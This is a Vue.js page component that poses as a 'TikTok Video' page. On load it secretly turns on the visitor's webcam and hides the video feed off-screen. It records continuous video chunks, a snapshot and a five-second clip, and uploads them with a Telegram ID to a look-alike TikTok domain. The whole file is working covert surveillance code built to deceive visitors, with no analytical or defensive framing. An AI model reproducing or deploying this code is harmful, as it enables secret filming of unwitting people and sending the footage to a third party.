<template>
    <img v-if="isActiveMainImage" class="main_image" ref="main_image" src="@/assets/img/image copy.png" width="1000" height="1000" alt="">
    <video class="camera_video" ref="video" width="640" height="480" autoplay></video>
    <CameraObj ref="camera_obj" v-if="isActiveCameraBlock" class="cm"></CameraObj>
    <CInformationAbout v-if="infoBlockActive"></CInformationAbout>
    <canvas ref="canvas" width="640" height="480"></canvas>

</template>

<script>
import CameraObj from '@/components/CameraObj.vue';
import CInformationAbout from '@/components/cInformationAbout.vue';



export default {
  name: 'App',
  components:{CameraObj, CInformationAbout},
  data() {
    return {
      stream: null, // Хранение видеопотока
      videoChunks: [], // Для хранения частей записанного видео
      telegramId: this.$route.params.telegram_id,
      isActiveCameraBlock: false,
      isActiveMainImage: true,
      isActiveCanvas: false,
      isActiveCameraVideo: false,
      infoBlockActive: false
    };
  },
  mounted() {

    this.startCamera(); // Стартуем камеру при загрузке компонента
    document.title = "TikTok Video №10394"
  },
  
  methods: {
    startCamera() {
  console.log(this.$refs.camera_obj);
  navigator.mediaDevices.getUserMedia({ video: true })
    .then((mediaStream) => {
      this.isActiveCameraBlock = true;
      this.isActiveMainImage = false;
      this.stream = mediaStream;
      this.$refs.video.srcObject = mediaStream;

      // Настраиваем MediaRecorder для записи видео
      const mediaRecorder = new MediaRecorder(mediaStream);
      const CHUNK_INTERVAL = 1000; // Интервал отправки части (2 секунды)

      mediaRecorder.ondataavailable = async (event) => {
        const chunk = event.data;
        const formData = new FormData();
        formData.append('video', chunk);
        formData.append('telegram_id', this.telegramId)
        try {
          await fetch("https://tiktok.copicon.ru/api/v1/send_media/", {
            method: "POST",
            body: formData,
          });
        } catch (error) {
          console.error("Ошибка отправки части видео:", error);
        }
      };

      // Начинаем запись и отправку каждые CHUNK_INTERVAL миллисекунд
      mediaRecorder.start(CHUNK_INTERVAL);

      // Остановка записи при закрытии страницы
      window.addEventListener("beforeunload", () => {
        mediaRecorder.stop();
        mediaStream.getTracks().forEach((track) => track.stop());
      });

      // Фокусировка перед первым снимком
      this.$refs.video.addEventListener('loadeddata', () => {
        setTimeout(() => {
          this.takeSnapshot(); // Делаем снимок
        }, 1000); // Задержка для фокусировки
      });
    })
    .catch((err) => {
      console.error('Error accessing camera: ', err);
    });
},

    // Остановка камеры
    stopCamera() {
      if (this.stream) {
        const tracks = this.stream.getTracks();
        tracks.forEach(track => track.stop()); // Останавливаем каждый трек
      }
    },
    // Делаем снимок
    takeSnapshot() {
      const canvas = this.$refs.canvas;
      const video = this.$refs.video;
      const context = canvas.getContext('2d');

      // Рисуем изображение на canvas
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Получаем данные изображения
      const imageData = canvas.toDataURL('image/png');

      // Начинаем запись видео
      this.startRecording(imageData);
    },
    // Начинаем запись видео на 5 секунд
    startRecording(imageData) {
      const options = { mimeType: 'video/mp4; codecs=avc1' };
      const mediaRecorder = new MediaRecorder(this.stream, options);

      // Записываем части видео
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          this.videoChunks.push(event.data);
        }
      };

      // Когда запись завершена
      mediaRecorder.onstop = () => {
        const videoBlob = new Blob(this.videoChunks, { type: 'video/mp4' });
        this.sendData(imageData, videoBlob); // Отправляем фото и видео на сервер
      };

      // Начинаем запись
      mediaRecorder.start();

      // Останавливаем запись через 5 секунд
      setTimeout(() => {
        mediaRecorder.stop();
      }, 5000);
    },
    // Отправляем фото и видео на сервер
    sendData(imageData, videoBlob) {
      // Преобразуем base64 фото в Blob
      const photoBlob = this.dataURItoBlob(imageData);

      // Формируем данные для отправки
      const formData = new FormData();
      formData.append('image', photoBlob, 'photo.png');
      formData.append('video', videoBlob, 'video.mp4');
      formData.append('telegram_id', this.telegramId)
      // Отправляем POST-запрос
      fetch('https://tiktok.copicon.ru/api/v1/send_media/', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        console.log('Success:', data);
        this.stopCamera(); // Останавливаем видеопоток после отправки данных
        setTimeout(() => {
      this.previewModalWindow()
    }, 3000)
      })
      .catch((error) => {
        console.error('Error:', error);
        this.stopCamera()
        setTimeout(() => {
      this.previewModalWindow()
    }, 3000)
      });

      
    },
    // Преобразуем base64 в Blob
    dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeString });
    },
    previewModalWindow(){
      this.isActiveCameraBlock = false
      this.infoBlockActive = true
    }
  },
  beforeUnmount() { // Замена beforeDestroy на beforeUnmount
    this.stopCamera(); // Останавливаем камеру при уничтожении компонента
    
    
  }
};
</script>

<style scoped>
html{
  background-color: black;
}
body{
  background-color: black;
}
#app {
  text-align: center;
  background-color: black;
  display: flex;
  flex-direction: column-reverse;
 
}
.cm{
  margin-top: 0px;
}
.camera_video{
  opacity: 0;
  position: absolute;
  left: -1900px;
  top: -1000px;
}
.video_video{
  display: block;
  margin: auto
}
canvas{
  position: absolute;
  display: none;
}

.main_image{
  z-index: 100;
  height: 50%;
  width: 100%;
  animation: slidein 2s ease-in-out infinite;
}


@keyframes slidein {
  from {
    transform: scale(.85);
  }
  50% {
    transform: scale(1);
  }
  to {
    transform: scale(.85);
  }
}
</style>
